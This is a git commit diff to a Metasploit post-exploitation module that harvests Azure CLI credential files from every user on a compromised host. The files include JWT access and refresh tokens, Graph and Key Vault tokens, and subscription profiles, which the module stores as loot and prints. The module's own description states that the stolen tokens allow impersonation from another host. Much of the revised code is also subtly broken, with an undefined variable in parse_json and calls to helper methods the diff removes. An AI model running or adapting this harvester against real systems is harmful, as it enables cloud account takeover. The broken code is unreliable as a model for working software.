7594a4103c2e39d645a232cf2ce504b22baa1273
h00die <michaeltcyr@gmail.com>
2024-06-04 20:01:54 -0400

    moving azure_cli_files around and stubbing out content
    Update azure lib with process_context_contents
    
    Update azure_spec.rb
    
    Update azure.rb
    
    Update azure_spec.rb
    
    Update azure_cli_creds.rb
    
    fix lint warning
    
    add function to print consolehost_history
    
    print_consolehost_history spec updates
    
    fixing azure_cli spec, and errors

--- modules/post/multi/gather/azure_cli_creds.rb
+++ modules/post/multi/gather/azure_cli_creds.rb
@@ -1,5 +1,5 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
@@ -9,64 +9,46 @@ class MetasploitModule < Msf::Post
   include Msf::Post::File
   include Msf::Post::Unix
   include Msf::Post::Windows::UserProfiles
+  include Msf::Post::Azure
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'          => 'Multi Gather Azure CLI credentials',
-      'Description'   => %q(
-        This module will collect the Azure CLI 2.0 (az cli) settings files
-        for all users on a given target. These configuration files contain
-        JWT tokens used to authenticate users and other subscription information.
-        Once tokens are stolen from one host, they can be used to impersonate
-        the user from a different host.
-      ),
-      'License'       => MSF_LICENSE,
-      'Author'        => ['James Otten <jamesotten1[at]gmail.com>'],
-      'Platform'      => ['win', 'linux', 'osx'],
-      'SessionTypes'  => ['meterpreter']
-    ))
+    super(
+      update_info(
+        info,
+        'Name' => 'Multi Gather Azure CLI Credentials',
+        'Description' => %q{
+          This module will collect the Azure CLI 2.0 (az cli) settings files
+          for all users on a given target. These configuration files contain
+          JWT tokens used to authenticate users and other subscription information.
+          Once tokens are stolen from one host, they can be used to impersonate
+          the user from a different host.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [
+          'James Otten <jamesotten1[at]gmail.com>', # original author
+          'h00die' # additions
+        ],
+        'Platform' => ['win', 'linux', 'osx'],
+        'SessionTypes' => ['meterpreter'],
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'Reliability' => [],
+          'SideEffects' => []
+        }
+      )
+    )
   end
 
-  def process_profile_file(file_path, file_data)
-    table_data = []
-    data = parse_json(file_path, file_data)
-    if data && data.key?("subscriptions")
-      data["subscriptions"].each do |item|
-        table_data << [file_path, item["name"], item["user"]["name"], item["environmentName"]]
-      end
-    end
-    table_data
-  end
-
-  def process_tokens_file(file_path, file_data)
-    table_data = []
-    data = parse_json(file_path, file_data)
-    if data
-      dic = {}
-      data.each do |item|
-        if dic.key?(item["userId"])
-          dic[item["userId"]] = dic[item["userId"]] + 1
-        else
-          dic[item["userId"]] = 1
-        end
-      end
-      dic.each do |key, value|
-        table_data << [file_path, key, value]
-      end
-    end
-    table_data
-  end
-
-  def parse_json(file_path, str)
-    data = nil
-    options = { :invalid => :replace, :undef => :replace, :replace => '' }
-    str = str.encode(Encoding.find('ASCII'), options)
+  def parse_json(data)
+    json_blob = nil
+    options = { invalid: :replace, undef: :replace, replace: '' }
+    str.encode(Encoding.find('ASCII'), options)
     begin
-      data = JSON.parse(str)
+      json_blob = JSON.parse(data)
     rescue ::JSON::ParserError
-      print_error("Unable to parse #{file_path}")
+      print_error('Unable to parse json blob')
     end
-    data
+    json_blob
   end
 
   def user_dirs
@@ -78,54 +60,96 @@ class MetasploitModule < Msf::Post
     elsif session.platform == 'linux' || session.platform == 'osx'
       user_dirs = enum_user_directories
     else
-      fail_with(Failure::BadConfig, "Unsupported platform")
+      fail_with(Failure::BadConfig, 'Unsupported platform')
     end
     user_dirs
   end
 
   def run
     subscription_table = Rex::Text::Table.new(
-      "Header" => "Subscriptions",
-      "Columns" => ["Source", "Account Name", "Username", "Cloud Name"]
+      'Header' => 'Subscriptions',
+      'Indent' => 1,
+      'Columns' => ['Source', 'Account Name', 'Username', 'Cloud Name']
     )
     tokens_table = Rex::Text::Table.new(
-      "Header" => "Tokens",
-      "Columns" => ["Source", "Username", "Count"]
+      'Header' => 'Tokens',
+      'Indent' => 1,
+      'Columns' => ['Source', 'Username', 'Count']
     )
-    loot_type = nil
-    description = nil
+    context_table = Rex::Text::Table.new(
+      'Header' => 'Context',
+      'Indent' => 1,
+      'Columns' => ['Username', 'Account Type', 'Access Token', 'Graph Access Token', 'MS Graph Access Token', 'Key Vault Token']
+    )
+
     user_dirs.map do |user_directory|
       vprint_status("Looking for az cli data in #{user_directory}")
-      %w[.azure/accessTokens.json .azure/azureProfile.json .azure/config].each do |file_location|
+      # leaving all these as lists for consistency and future expansion
+
+      # ini file content, not json.
+      vprint_status('  Checking for config files')
+      %w[.azure/config].each do |file_location|
         possible_location = ::File.join(user_directory, file_location)
-        if exists?(possible_location)
-          data = read_file(possible_location)
-          if data
-            vprint_status("Found az cli file #{possible_location}")
-            if file_location.end_with?("accessTokens.json")
-              loot_type = "azurecli.jwt_tokens"
-              description = "Azure CLI access/refresh JWT tokens"
-              process_tokens_file(possible_location, data).each do |item|
-                tokens_table << item
-              end
-            elsif file_location.end_with?("config")
-              loot_type = "azurecli.config"
-              description = "Azure CLI configuration"
-            elsif file_location.end_with?("azureProfile.json")
-              loot_type = "azurecli.azure_profile"
-              description = "Azure CLI profile"
-              process_profile_file(possible_location, data).each do |item|
-                subscription_table << item
-              end
-            end
-            stored = store_loot(loot_type, "text/plain", session, data, file_location, description)
-            print_good("#{possible_location} stored to #{stored}")
+        next unless exists?(possible_location)
+        next unless readable?(possible_location)
+
+        data = read_file(possible_location)
+        next unless data
+
+        # https://stackoverflow.com/a/16088751/22814155 no ini ctype
+        loot = store_loot 'azure.config.ini', 'text/plain', session, data, file_location, 'Azure CLI Config'
+        print_good "    #{file_location} stored in #{loot}"
+      end
+
+      vprint_status('  Checking for context files')
+      %w[.azure/AzureRmContext.json].each do |file_location|
+        possible_location = ::File.join(user_directory, file_location)
+        next unless exists?(possible_location)
+        next unless readable?(possible_location)
+
+        data = read_file(possible_location)
+        next unless data
+
+        loot = store_loot 'azure.context.json', 'text/json', session, data, file_location, 'Azure CLI Context'
+        print_good "    #{file_location} stored in #{loot}"
+        data = parse_json(data)
+        results = process_context_contents(data)
+        results.each do |result|
+          context_table << result
+        end
+      end
+
+      %w[.azure/accessTokens.json .azure/azureProfile.json].each do |file_location|
+        possible_location = ::File.join(user_directory, file_location)
+        next unless exists?(possible_location)
+
+        data = read_file(possible_location)
+        next unless data
+
+        vprint_status("Found az cli file #{possible_location}")
+        if file_location.end_with?('accessTokens.json')
+          loot_type = 'azurecli.jwt_tokens'
+          description = 'Azure CLI access/refresh JWT tokens'
+          process_tokens_file(possible_location, data).each do |item|
+            tokens_table << item
+          end
+        elsif file_location.end_with?('config')
+          loot_type = 'azurecli.config'
+          description = 'Azure CLI configuration'
+        elsif file_location.end_with?('azureProfile.json')
+          loot_type = 'azurecli.azure_profile'
+          description = 'Azure CLI profile'
+          process_profile_file(possible_location, data).each do |item|
+            subscription_table << item
           end
         end
+        stored = store_loot(loot_type, 'text/plain', session, data, file_location, description)
+        print_good("#{possible_location} stored to #{stored}")
       end
     end
 
-    print_line(subscription_table.to_s)
-    print_line(tokens_table.to_s)
+    print_good(subscription_table.to_s) unless subscription_table.rows.empty?
+    print_good(tokens_table.to_s) unless tokens_table.rows.empty?
+    print_good(context_table.to_s) unless context_table.rows.empty?
   end
 end
